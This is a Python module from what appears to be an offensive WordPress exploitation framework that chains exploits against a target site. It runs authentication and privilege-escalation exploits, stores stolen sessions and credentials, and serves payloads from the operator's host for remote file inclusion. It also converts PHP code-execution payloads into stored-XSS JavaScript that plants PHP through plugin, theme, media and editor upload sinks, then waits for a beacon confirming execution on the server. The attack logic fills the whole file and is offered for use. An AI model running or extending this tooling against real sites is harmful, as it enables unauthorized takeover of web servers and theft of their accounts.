"""
HWP Chain - Resolves and executes exploit chains.

Chain resolution (right-to-left):
    payload → rightmost exploit (capability match) → transformers → delivery → target

AUTH exploits run first, providing sessions for auth_required exploits.
Transformer exploits (delivers != None) wrap instructions before delivery.

Output rules:
    Exploit:   info/success = verbose only (-v), error = always
    Payload:   info/success/error = always
    Framework: result dump = very verbose only (-vv), errors = always
"""

import re
import sys
import traceback
from lib.exploit import (
    Exploit, resolve_capability, resolve_capabilities, requires_auth,
)
from lib.payload import Payload, resolve_method
from lib.result import Result
from lib import output
from lib import store


def resolve_capability_delivers(exploit_cls):
    """Return a transformer's `delivers` field, resolved through aliases.

    Used to detect what a transformer produces (e.g. "XSS") so the framework
    can wire up the right post-chain behaviour. Returns None for non-transformers.
    """
    d = getattr(exploit_cls, "delivers", None)
    return resolve_capability(d) if d else None


def _resolve_placeholder(instruction, prev_result):
    """Replace {prev.X} placeholders with values from previous Result."""
    if prev_result is None or not isinstance(instruction, str):
        return instruction

    def replacer(match):
        field = match.group(1)
        val = getattr(prev_result, field, None)
        if val is None:
            output.warn(f"Placeholder {{prev.{field}}} has no value")
            return match.group(0)
        return str(val)

    return re.sub(r"\{prev\.(\w+)\}", replacer, instruction)


def match_payload_to_exploit(exploit_classes, payload_class, xss_adapter=False):
    """
    Find which exploit the payload should attach to.
    Searches right-to-left. Returns (index, matched_method, needs_server) or (None, None, False).

    Matching rules:
        - Direct match: exploit cap == payload method → use directly
        - RFI fallback: exploit needs RFI, payload has AFU but not RFI →
          framework will serve payload content via HTTP server
        - XSS→RCE adapter: when enabled, an XSS exploit accepts an RCE payload.
          The framework's core adapter bridges the RCE instruction into XSS JS.
    """
    if payload_class is None:
        return None, None, False

    payload_methods = [resolve_method(m) for m in payload_class.methods]

    # First pass: direct capability match (rightmost). Multi-capability exploits
    # match on any of their declared capabilities.
    for i in range(len(exploit_classes) - 1, -1, -1):
        for cap in resolve_capabilities(exploit_classes[i].capability):
            if cap in payload_methods:
                return i, cap, False

    # Second pass: RFI exploit + AFU payload → framework serves content via HTTP
    for i in range(len(exploit_classes) - 1, -1, -1):
        if "RFI" in resolve_capabilities(exploit_classes[i].capability) and "AFU" in payload_methods:
            return i, "AFU", True  # method=AFU (get content), but serve via HTTP

    # Third pass: XSS→RCE adapter — XSS exploit + RCE payload
    if xss_adapter and "RCE" in payload_methods:
        for i in range(len(exploit_classes) - 1, -1, -1):
            if "XSS" in resolve_capabilities(exploit_classes[i].capability):
                # Payload emits RCE; adapter will convert to XSS JS.
                return i, "RCE", False

    return None, None, False


def _dump_result(result, verbose):
    """Dump Result fields — only at -vv level."""
    if verbose < 2:
        return
    output.debug(f"Result: success={result.success}")
    for field in ("output", "rows_affected", "insert_id", "url", "path",
                  "session", "credentials", "message"):
        val = getattr(result, field, None)
        if val is not None:
            output.debug(f"  .{field} = {val!r}")


def _wp_login(target, credentials, verbose=0):
    """Attempt WordPress login with credentials, return session cookies or None."""
    import requests

    username = credentials.get("user") or credentials.get("username", "")
    password = credentials.get("pass") or credentials.get("password", "")

    if not username or not password:
        return None

    login_url = f"{target}/wp-login.php"

    try:
        resp = requests.post(login_url, data={
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": f"{target}/wp-admin/",
            "testcookie": "1",
        }, allow_redirects=False, timeout=15)
    except Exception as e:
        if verbose:
            output.warn(f"wp-login.php request failed: {e}")
        return None

    # WordPress sets cookies on successful login and redirects (302)
    cookies = {c.name: c.value for c in resp.cookies}

    # Check for wordpress_logged_in cookie
    has_auth = any(k.startswith("wordpress_logged_in") for k in cookies)

    if has_auth:
        if verbose:
            output.info(f"Logged in as {username} via wp-login.php")
        return cookies
    else:
        output.warn(f"wp-login.php: login failed for {username}")
        return None


def _select_mode(ecls, options):
    """Choose which declared capability this exploit runs as (multi-capability).

    Operator override via options['as']; otherwise auth-phase caps win
    (AUTH > PRIVESC), else the first declared delivery/OTHER capability.
    """
    caps = resolve_capabilities(ecls.capability)
    if not caps:
        return None
    forced = options.get("as") if options else None
    if forced and forced in caps:
        return forced
    for c in ("AUTH", "PRIVESC"):
        if c in caps:
            return c
    return caps[0]


def _run_exploit(ecls, target, domain, options, session_cookies, credentials,
                 verbose, instruction, mode=None):
    """Run a single exploit with error handling. Returns Result or exits."""
    instance = ecls(
        target=target, domain=domain, options=options,
        session_cookies=session_cookies, credentials=credentials,
        verbose=verbose, mode=mode,
    )

    try:
        result = instance.exploit(instruction)
    except Exception:
        output.error(f"Exploit({ecls.type}/{ecls.slug}) failed with the following error:")
        traceback.print_exc()
        sys.exit(1)

    if result is None:
        output.error(f"Exploit({ecls.type}/{ecls.slug}) did not return a result.")
        output.error("Exploits need to return through self.result()")
        sys.exit(1)

    if not isinstance(result, Result):
        output.error(f"Exploit({ecls.type}/{ecls.slug}) returned {type(result).__name__} instead of Result.")
        output.error("Exploits need to return through self.result()")
        sys.exit(1)

    return result


def _run_auth_adapter(payload_class, target, domain, options, session_cookies, credentials, verbose):
    """Deliver an RCE payload via a stored admin session (no delivery exploit).

    The direct-HTTP twin of the XSS→RCE adapter: uses the stored administrator
    cookies to drop and trigger the payload through WP-admin sinks.
    """
    from lib.auth_adapter import AuthRCEAdapter

    payload_methods = [resolve_method(m) for m in payload_class.methods]
    if "RCE" not in payload_methods:
        output.error("--auth-rce-adapter requires an RCE payload (payload must offer RCE).")
        return []

    role = (credentials or {}).get("role")
    if role and role != "administrator":
        output.warn(f"Stored session role is '{role}'. AUTH→RCE sinks need administrator; attempting anyway.")

    payload_instance = payload_class(target=target, domain=domain, options=options, verbose=verbose)
    payload_instance.method = "RCE"
    try:
        instructions = payload_instance.instructions()
    except Exception:
        output.error(f"Payload({payload_class.name}) failed with the following error:")
        traceback.print_exc()
        sys.exit(1)
    if instructions is None:
        instructions = []
    if isinstance(instructions, str):
        instructions = [instructions]
    if not instructions:
        return []

    beacon_server = None
    if options.get("lhost"):
        from lib.beacon_server import BeaconServer
        beacon_server = BeaconServer(options["lhost"], options.get("lport", "8888"))
        if not beacon_server.start():
            beacon_server = None

    adapter = AuthRCEAdapter(target, session_cookies, options, verbose)
    all_results = []
    try:
        output.info("AUTH→RCE adapter: delivering payload via stored admin session…")
        for instr in instructions:
            all_results.append(adapter.deliver(instr))

        try:
            payload_instance.report(all_results)
        except Exception:
            output.error(f"Payload({payload_class.name}) failed with the following error:")
            traceback.print_exc()
            sys.exit(1)

        if any(r.success for r in all_results):
            if beacon_server:
                timeout = int(options.get("beacon-timeout", 120))
                output.info(f"Waiting up to {timeout}s for server-side beacon…")
                if beacon_server.wait(timeout=timeout):
                    data = beacon_server.data or {}
                    output.success("Beacon received — PHP executed on the server (RCE confirmed)")
                    if isinstance(data, dict):
                        if data.get("loader"):
                            output.success(f"  Loader landed:  {data['loader']}")
                        if data.get("output"):
                            output.success(f"  Payload output: {str(data['output'])[:300]}")
                        if data.get("user"):
                            output.success(f"  Running as:     {data['user']}")
                else:
                    output.warn("No beacon received within timeout (delivery still verified inline).")
        else:
            output.error("AUTH→RCE adapter: delivery failed — no admin sink was reachable.")
            output.warn("The session may lack administrator/upload capability, or all files were blocked.")
    finally:
        if beacon_server:
            beacon_server.stop()
    return all_results


def run_chain(exploit_classes, payload_class, target, domain, options, verbose=0):
    """
    Execute an exploit chain.

    Args:
        exploit_classes: List of Exploit subclasses (CLI order: left=first, right=last)
        payload_class:   Payload subclass or None
        target:          Normalized target URL
        domain:          Target domain
        options:         Dict of extra CLI args
        verbose:         0 = normal, 1 = verbose (-v), 2 = very verbose (-vv)
    """
    # ── Phase 1: Load stored auth ─────────────────────────────────────
    session_cookies = store.load_session(domain)
    credentials = store.load_credentials(domain)

    # CLI-provided auth overrides
    if options.get("cookie"):
        session_cookies = _parse_cookie_string(options["cookie"])
        store.save_session(domain, session_cookies)

    if options.get("user") and options.get("pass"):
        credentials = {"user": options["user"], "pass": options["pass"]}

    # ── Phase 2: Classify exploits by selected mode ───────────────────
    # AUTH and PRIVESC run in the auth phase (no payload). Everything else is a
    # delivery / transformer / OTHER exploit. Multi-capability exploits pick a
    # mode (operator --as override, else AUTH > PRIVESC > first delivery/OTHER).
    auth_exploits = []
    privesc_exploits = []
    chain_exploits = []

    for ecls in exploit_classes:
        mode = _select_mode(ecls, options)
        if mode == "AUTH":
            auth_exploits.append(ecls)
        elif mode == "PRIVESC":
            privesc_exploits.append(ecls)
        else:
            chain_exploits.append(ecls)

    # ── Phase 3: Run AUTH exploits first ──────────────────────────────
    for ecls in auth_exploits:
        # Some AUTH exploits escalate an existing low-priv session into a new
        # (admin) account, so they can themselves require a starting session.
        if requires_auth(ecls) and not session_cookies:
            output.error(f"AUTH exploit {ecls.info_str()} needs an existing session to run.")
            output.error("Provide --cookie / --user+--pass, or chain a prior AUTH exploit.")
            return []
        result = _run_exploit(
            ecls, target, domain, options,
            session_cookies, credentials, verbose,
            instruction=None, mode="AUTH",
        )
        _dump_result(result, verbose)

        if not result.success:
            return []   # exploit's self.error() already printed details

        # An AUTH exploit must produce reusable auth material.
        if not (result.session or result.credentials):
            output.error(f"AUTH exploit {ecls.info_str()} succeeded but produced "
                         "no session or credentials.")
            return []
        if result.session:
            session_cookies = result.session
            store.save_session(domain, session_cookies)
        if result.credentials:
            credentials = result.credentials
            store.save_credentials(domain, credentials)
        if result.message:
            output.success(result.message)

    # ── Phase 3.5: Credentials → Session bridge ──────────────────────
    # If we have credentials but no session cookies, attempt wp-login.php so
    # PRIVESC and auth-required exploits below have a usable session.
    if credentials and not session_cookies:
        session_cookies = _wp_login(target, credentials, verbose)
        if session_cookies:
            store.save_session(domain, session_cookies)

    # ── Phase 4: Run PRIVESC exploits (after AUTH, before delivery) ────
    for ecls in privesc_exploits:
        if requires_auth(ecls) and not session_cookies:
            output.error(f"PRIVESC exploit {ecls.info_str()} needs an existing session.")
            output.error("Chain an AUTH exploit first, or use --cookie / --user+--pass.")
            return []
        result = _run_exploit(
            ecls, target, domain, options,
            session_cookies, credentials, verbose,
            instruction=None, mode="PRIVESC",
        )
        _dump_result(result, verbose)
        if not result.success:
            if result.message:
                output.error(result.message)
            return []
        if result.session:
            session_cookies = result.session
            store.save_session(domain, session_cookies)
        if result.credentials:
            credentials = result.credentials
            store.save_credentials(domain, credentials)
        if result.message:
            output.success(result.message)

    # ── Phase 5: Auth-phase-only run (no delivery exploits) ───────────
    if not chain_exploits:
        # AUTH→RCE adapter: with a payload but no delivery exploit, deliver the
        # RCE payload directly using the stored admin session as the vector.
        auth_adapter = bool(options.get("auth-rce-adapter") or options.get("auth_rce_adapter"))
        if auth_adapter and payload_class is not None:
            if not session_cookies:
                output.error("--auth-rce-adapter needs a stored admin session "
                             "(use --cookie, --user/--pass, or chain an AUTH exploit).")
                return []
            return _run_auth_adapter(payload_class, target, domain, options,
                                     session_cookies, credentials, verbose)
        return []

    # ── Auth gate: delivery exploits that need a session ──────────────
    for ecls in chain_exploits:
        if requires_auth(ecls) and not session_cookies:
            output.error(f"Exploit {ecls.info_str()} requires authentication.")
            output.error("Add an AUTH exploit to the chain, use --cookie, or use --user/--pass.")
            return []

    # ── Phase 6: Match payload to exploit ─────────────────────────────
    xss_adapter = bool(options.get("xss-rce-adapter") or options.get("xss_rce_adapter"))
    payload_idx, matched_method, needs_rfi_server = match_payload_to_exploit(
        chain_exploits, payload_class, xss_adapter=xss_adapter
    )

    if payload_class is not None and payload_idx is None:
        output.error("Payload is not compatible with any exploit in the chain.")
        output.warn(f"  Payload needs: {payload_class.methods}")
        for ecls in chain_exploits:
            output.warn(f"  Exploit offers: {ecls.capability}")
        return []

    # Determine whether the core XSS→RCE adapter actually applies to this run:
    # adapter enabled AND the matched exploit is an XSS sink AND payload gave RCE.
    adapter_active = (
        xss_adapter
        and matched_method == "RCE"
        and payload_idx is not None
        and "XSS" in resolve_capabilities(chain_exploits[payload_idx].capability)
    )

    # ── Phase 7: Get instructions from payload ────────────────────────
    rfi_server = None
    if payload_class and matched_method:
        payload_instance = payload_class(target=target, domain=domain, options=options, verbose=verbose)
        payload_instance.method = matched_method
        try:
            instructions = payload_instance.instructions()
        except Exception:
            output.error(f"Payload({payload_class.name}) failed with the following error:")
            traceback.print_exc()
            sys.exit(1)

        if instructions is None:
            instructions = []
        if isinstance(instructions, str):
            instructions = [instructions]

        # XSS→RCE adapter: convert each RCE (PHP) instruction into admin-context
        # JS that drops the PHP via a sink. The payload stays unchanged — this
        # transformation is owned entirely by the framework's core adapter.
        if adapter_active and instructions:
            from lib import adapter as _adapter
            converted = [_adapter.make_js(instr, options) for instr in instructions]
            instructions = converted

        # RFI server fallback: exploit needs RFI, payload gave us AFU content
        # Spin up HTTP server to serve the content, replace instructions with URL
        if needs_rfi_server and instructions:
            lhost = options.get("lhost", "")
            lport = options.get("lport", "8888")
            if not lhost:
                output.error("RFI server fallback requires --lhost (your reachable IP)")
                output.error("The target needs to fetch the payload from this address.")
                return []

            from lib.rfi_server import RFIServer
            content = instructions[0]  # AFU payload content
            rfi_server = RFIServer(content, lhost, lport)
            url = rfi_server.start()
            if not url:
                return []
            instructions = [url]
    else:
        instructions = [None]

    # ── Phase 8: Identify delivery exploit and transformers ───────────
    delivery_idx = None
    for i, ecls in enumerate(chain_exploits):
        if ecls.delivers is None:
            delivery_idx = i
            break

    if delivery_idx is None:
        output.error("No delivery exploit in chain (all exploits are transformers).")
        return []

    delivery_cls = chain_exploits[delivery_idx]
    transformer_classes = [
        ecls for i, ecls in enumerate(chain_exploits) if i != delivery_idx
    ]
    transformer_classes.reverse()

    # Delivery mode: the payload-matched capability, or (payload-less run) the
    # exploit's own selected mode (e.g. OTHER standalone).
    delivery_mode = matched_method if (payload_class and matched_method) else _select_mode(delivery_cls, options)

    # ── Phase 8.5: Beacon listener hook ───────────────────────────────
    # When the core XSS→RCE adapter is active and the operator set --lhost,
    # the adapter injected a server-side beacon into the dropped PHP. The
    # framework owns the listener lifecycle: start it before the chain runs,
    # wait for the callback after report(). The adapter needs no framework-
    # internal access — it just emits beacon PHP and the framework waits.
    beacon_server = None
    wants_beacon = adapter_active and options.get("lhost")
    if wants_beacon:
        from lib.beacon_server import BeaconServer
        lport = options.get("lport", "8888")
        beacon_server = BeaconServer(options["lhost"], lport)
        if not beacon_server.start():
            beacon_server = None

    # ── Phase 9: Execute ──────────────────────────────────────────────
    all_results = []
    prev_result = None

    try:
        for instruction in instructions:
            instruction = _resolve_placeholder(instruction, prev_result)

            # Pass through transformers (right-to-left)
            current = instruction
            for tcls in transformer_classes:
                t_caps = resolve_capabilities(tcls.capability)
                t_result = _run_exploit(
                    tcls, target, domain, options,
                    session_cookies, credentials, verbose,
                    instruction=current, mode=(t_caps[0] if t_caps else None),
                )
                _dump_result(t_result, verbose)

                if t_result.success and t_result.output:
                    current = t_result.output
                else:
                    return all_results

            # Deliver to target
            result = _run_exploit(
                delivery_cls, target, domain, options,
                session_cookies, credentials, verbose,
                instruction=current, mode=delivery_mode,
            )
            _dump_result(result, verbose)

            all_results.append(result)
            prev_result = result

            # Silently store session/credentials if provided
            if result.session:
                store.save_session(domain, result.session)
            if result.credentials:
                store.save_credentials(domain, result.credentials)

        # XSSr is display-only: reflected XSS fires in the victim's browser, so
        # the framework shows the crafted URL(s) and copies them — it never
        # requests the target. The exploit only builds the URL (result.url).
        if "XSSr" in resolve_capabilities(delivery_cls.capability):
            for r in all_results:
                if r.success and r.url:
                    output.xssr_url(r.url, r.message or "")
        elif payload_class is None:
            # No payload (e.g. SQLIq/AFD/OTHER run standalone): surface the
            # delivery result so the operator actually sees what it produced.
            for r in all_results:
                if r.message:
                    output.info(r.message)
                if r.output:
                    print(r.output)

        # Post-execution — payload handles its own output
        if payload_class and matched_method:
            try:
                payload_instance.report(all_results)
            except Exception:
                output.error(f"Payload({payload_class.name}) failed with the following error:")
                traceback.print_exc()
                sys.exit(1)

        # ── Phase 9.5: XSS→RCE adapter operator messaging ─────────────
        # report() belongs to the (unchanged) payload and knows nothing about
        # XSS. All XSS-specific messaging is emitted HERE by the framework.
        if adapter_active:
            if beacon_server:
                output.info("XSS payload stored. Trigger it by loading an injected")
                output.info("page as an authenticated admin (or wait for a victim).")

                timeout = int(options.get("beacon-timeout", 300))
                output.info(f"Waiting up to {timeout}s for server-side callback…")

                if beacon_server.wait(timeout=timeout):
                    data = beacon_server.data or {}
                    output.success("Beacon received — PHP executed on the server (RCE confirmed)")
                    if isinstance(data, dict):
                        # The adapter knows only what IT did: where its loader
                        # vehicle landed (__FILE__) and whatever the payload's
                        # own PHP echoed. It does NOT know where the payload
                        # wrote anything — that's in the payload's output, if it
                        # chose to report it.
                        if data.get("loader"):
                            output.success(f"  Loader landed:   {data['loader']}")
                        out = data.get("output")
                        if out:
                            output.success(f"  Payload output:  {str(out)[:300]}")
                        if data.get("user"):
                            output.success(f"  Running as:      {data['user']}")
                        if data.get("raw"):
                            output.info(f"  Beacon body:     {str(data['raw'])[:200]}")
                else:
                    output.warn("No beacon received within timeout.")
                    output.warn("The JS may not have fired yet, the admin may lack")
                    output.warn("editor/upload capability, or every sink was blocked.")
            else:
                # Drop-only mode: no beacon, so describe what the JS will attempt.
                # The adapter names nothing for the payload, so there is no drop
                # name to report here — only the sink strategy.
                output.success("XSS payload stored.")
                output.info("Trigger by loading an injected page as an authenticated admin.")
                output.info("On fire, the adapter JS attempts these sinks in order:")
                output.info("  1. plugin-upload  → installs a throwaway plugin carrying your PHP")
                output.info("  2. theme-upload   → installs a throwaway theme carrying your PHP")
                output.info("  3. media-upload   → uploads your PHP to wp-content/uploads/ (needs unfiltered_upload)")
                output.info("  4. theme-editor   → prepends your PHP atop an existing theme file")
                output.info("  5. plugin-editor  → prepends your PHP atop an existing plugin file")
                output.info("Each sink verifies the file is reachable before claiming success.")
                output.info("Set --lhost/--lport to confirm server-side execution via beacon.")
    finally:
        # Clean up RFI server if it was started
        if rfi_server:
            rfi_server.stop()
        # Clean up beacon listener if it was started
        if beacon_server:
            beacon_server.stop()

    return all_results


def _parse_cookie_string(cookie_str):
    """Parse 'key=val; key2=val2' into a dict."""
    cookies = {}
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            key, val = part.split("=", 1)
            cookies[key.strip()] = val.strip()
    return cookies
